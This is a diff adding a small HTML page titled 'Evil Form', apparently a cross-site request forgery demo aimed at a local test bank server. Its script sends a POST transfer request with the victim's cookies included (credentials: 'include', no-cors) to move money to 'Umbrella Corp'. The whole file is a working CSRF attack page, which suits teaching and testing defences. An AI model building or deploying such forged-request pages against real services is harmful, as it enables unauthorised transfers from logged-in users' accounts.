@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Evil Form</title>
+</head>
+<body>
+  <label for="recip">Recipient:</label>
+  <input type="text" name="recip" id="recip" value="Umbrella Corp"><br>
+  <label for="amt">Amount</label>
+  <input type="text" name="amt" id="amt" value="666"><br>
+  <button id="send">Send</button>
+<script>
+  window.onload = function() {
+    const recip = document.querySelector('#recip');
+    const amt = document.querySelector('#amt');
+    const btn = document.querySelector('#send');
+    btn.addEventListener('click', handlePost, false);
+
+    function handlePost(e) {
+      e.preventDefault();
+      const data = `recipient=${recip.value}&amount=${amt.value}`
+      console.log(data);
+
+      fetch('http://bank.127.0.0.1.xip.io:8080/transfer', {
+        method: 'POST',
+        mode: 'no-cors',
+        credentials: 'include',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: data
+      })
+        .then(response => response.text())
+        .then(text => console.log(text))
+        .catch(err => console.log(err));
+    }
+  }
+</script>
+</body>
+</html>
